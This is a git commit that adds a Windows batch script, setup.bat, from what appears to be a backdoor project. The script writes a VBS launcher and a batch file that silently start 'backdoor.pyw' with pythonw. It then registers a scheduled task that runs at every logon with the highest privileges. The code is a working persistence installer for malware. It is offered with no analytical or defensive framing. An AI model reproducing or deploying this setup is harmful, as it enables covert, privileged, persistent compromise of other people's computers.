5211512bc561f654c1a4448b2065498fbc90115b
Jevelin4k <jevelin4k@gmail.com>
2024-07-28 19:42:23 +0200

    Add files via upload

---
+++ v2.0/setup.bat
@@ -0,0 +1,7 @@
+@echo off
+echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\up_2.vbs
+echo WshShell.Run "cmd.exe /c C:\Windows\backdoor\v2.0\up_2.bat", 0, False >> C:\Windows\backdoor\v2.0\up_2.vbs
+echo @echo off > C:\Windows\backdoor\v2.0\up_2.bat
+echo pythonw C:\Windows\backdoor\v2.0\backdoor.pyw >> C:\Windows\backdoor\v2.0\up_2.bat
+schtasks /create /tn "backdoor_up_2" /tr "C:\Windows\backdoor\v2.0\up_2.vbs" /sc onlogon /rl highest /f
+pause
